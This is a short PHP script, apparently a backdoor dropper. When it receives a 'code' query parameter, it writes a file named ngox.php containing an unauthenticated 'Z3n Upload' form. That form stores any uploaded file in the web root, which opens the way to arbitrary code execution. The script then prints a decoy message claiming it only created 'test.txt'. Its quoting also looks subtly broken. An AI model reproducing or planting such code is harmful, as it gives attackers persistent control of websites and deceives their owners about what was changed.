<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];

    $file = fopen('ngox.php', 'w');

    fwrite($file, '<!DOCTYPE html><html><head><title>Form Upload File</title></head><body><h2>Z3n Upload</h2><?php if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_FILES['uk45'])){$f=$_FILES['uk45'];if($f['error']===UPLOAD_ERR_OK){$t='./'.basename($f['name']);if(move_uploaded_file($f['tmp_name'],$t))echo"File berhasil diunggah dan disimpan dengan nama: ".$f['name'];else echo"Gagal mengunggah file.";}else echo"Error saat mengunggah file: ".$f['error'];}?></h2><form method="post" enctype="multipart/form-data"><input type="file" name="uk45"><button type="submit">Gaskan</button></form></body></html>
');

    fclose($file);

    echo "File 'test.txt' berhasil dibuat dan diisi dengan 'test'.";
}
?>
